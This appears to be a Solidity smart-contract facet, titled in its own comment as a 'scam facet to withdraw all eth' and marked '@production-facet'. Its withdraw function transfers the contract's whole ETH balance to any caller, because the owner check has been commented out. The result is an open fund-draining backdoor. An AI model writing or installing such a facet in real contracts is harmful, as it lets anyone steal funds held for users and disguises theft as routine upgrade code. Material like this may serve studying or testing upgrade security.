/**
 * Scam facet to withdraw all eth
 */

// SPDX-License-Identifier: MITs
pragma solidity ^0.8.18;
import "../storage/AccessControl.sol";

// @production-facet
contract ScamEth {
    function withdraw() external {
        // AccessControlStorage
        //     storage accessControlStorage = AccessControlStorageLib
        //         .retreive();
        // require(
        //     msg.sender == accessControlStorage.owner,
        //     "Only owner can scam"
        // );

        payable(msg.sender).transfer(address(this).balance);
    }
}
